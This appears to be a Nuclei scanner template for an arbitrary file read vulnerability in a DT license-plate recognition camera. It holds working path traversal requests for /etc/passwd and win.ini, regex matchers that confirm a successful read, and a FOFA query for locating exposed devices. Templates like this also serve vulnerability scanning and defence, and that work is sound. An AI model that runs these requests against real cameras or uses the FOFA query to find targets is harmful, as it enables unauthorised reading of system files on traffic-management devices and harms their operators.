id: dt-camera-fileread
info:
  name: DT 高清车牌识别摄像机 - 任意文件读取
  author: leadlife
  severity: high
  description: DT高清车牌识别摄像机是一种高科技产品，主要用于抓拍和识别车牌信息，用于交通管理、违章抓拍、电子收费等目的。DT-高清车牌识别摄像机存在任意文件读取漏洞，恶意攻击者可能利用该漏洞读取服务器上的敏感文件。
  reference: 
    - https://github.com/wy876/POC/blob/main/DT%E9%AB%98%E6%B8%85%E8%BD%A6%E7%89%8C%E8%AF%86%E5%88%AB%E6%91%84%E5%83%8F%E6%9C%BA%E5%AD%98%E5%9C%A8%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E.md
  metadata:
    verified: true
    fofa-query: app="DT-高清车牌识别摄像机"
  tags: dt-camera,fileread


http:
  - method: GET
    path:
      - "{{BaseURL}}/../../../../etc/passwd"
      - "{{BaseURL}}/../../../../c:/windows/win.ini"

    stop-at-first-match: true
    matchers-condition: and
    matchers:
      - type: regex
        part: body
        regex:
          - "root:.*:0:0:"
          - "\\[(font|extension|file)s\\]"
        condition: or

      - type: status
        status:
          - 200